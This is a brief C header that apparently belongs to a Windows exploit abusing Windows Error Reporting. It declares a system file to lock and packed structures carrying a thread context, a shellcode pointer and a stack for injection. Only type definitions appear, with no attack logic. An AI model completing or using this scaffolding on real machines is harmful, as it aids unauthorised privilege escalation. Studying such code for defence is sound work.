#pragma once


const wchar_t fileToLock[] = L"C:\\Windows\\System32\\license.rtf";
const wchar_t STAData[] = L"Free";

#pragma pack(push, 1)
typedef struct _WER_MAPPED_SECTION_HEADER {
	DWORD Unk;
	DWORD ProcessId;
	RPC_CSTR Cookie;
} WER_MAPPED_SECTION_HEADER, * PWER_MAPPED_SECTION_HEADER;

typedef struct _WER_MAPPED_SECTION_PAYLOAD {
	PCONTEXT sampleContext;
	PVOID shellcode;
	PVOID stack;
} WER_MAPPED_SECTION_PAYLOAD, * PWER_MAPPED_SECTION_PAYLOAD;
#pragma pack(pop)
